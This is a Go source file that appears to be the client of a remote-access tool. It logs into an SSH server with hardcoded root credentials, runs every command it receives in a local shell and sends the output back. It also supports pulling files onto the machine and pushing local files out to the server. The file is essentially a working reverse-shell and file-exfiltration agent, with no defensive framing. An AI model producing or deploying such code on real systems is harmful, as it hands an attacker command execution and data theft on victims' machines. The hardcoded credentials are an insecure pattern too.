package main

import (
	"client/core"
	"os"
	"path/filepath"
	"strings"
)

//Declare global variables
const (
	ServerAddr     = "127.0.0.1:22"
	ServerLogin    = "root"
	ServerPassword = "passwd"
)

var (
	shell = core.NewShell()
)

func main() {

	sshClient := core.NewSSHClient(ServerAddr)

	for {

		if err := sshClient.Login(ServerLogin, ServerPassword); err != nil {
			panic(err)
		}

		sshClient.Listener(func(data []byte) {
			dataString := string(data)
			dataSplit := strings.Split(dataString, " ")
			lenDataSplit := len(dataSplit)

			switch cmd := dataSplit[0]; cmd {
			case "cd":
				if lenDataSplit > 1 {
					temp, _ := filepath.Abs(dataSplit[1])
					os.Chdir(temp)
				}
			case "upload":
				if lenDataSplit > 1 {
					sshClient.DownloadRemote(strings.Join(dataSplit[1:], " "))
				}
			case "download":
				if lenDataSplit > 1 {
					err := sshClient.UploadLocal(strings.Join(dataSplit[1:], " "))
					if err != nil {
						println(err.Error())
					}
				}
			}

			shell.Stop()
			shell.Exec(dataString, func(cmdOutput []byte) error {
				err := sshClient.Write(append(cmdOutput, '\n'))
				return err
			})
			sshClient.Write([]byte("\n> "))
		})
	}
}
